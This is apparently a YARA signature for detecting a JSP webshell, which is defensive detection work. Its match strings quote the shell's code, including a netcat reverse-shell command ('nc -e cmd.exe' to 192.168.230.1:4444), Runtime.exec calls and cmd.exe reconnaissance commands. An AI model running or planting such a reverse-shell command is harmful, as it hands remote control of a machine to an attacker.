rule Txt_jsp {
  meta:
    author = "Spider"
    comment = "None"
    date = "2015-06-14"
    description = "Chinese Hacktool Set - Webshells - file jsp.txt"
    family = "None"
    hacker = "None"
    hash = "74518faf08637c53095697071db09d34dbe8d676"
    judge = "black"
    license = "https://creativecommons.org/licenses/by-nc/4.0/"
    reference = "http://tools.zjqhr.com/"
    threatname = "None"
    threattype = "None"
  strings:
    $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
    $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
    $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
    $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
  condition:
    filesize < 715KB and 2 of them
}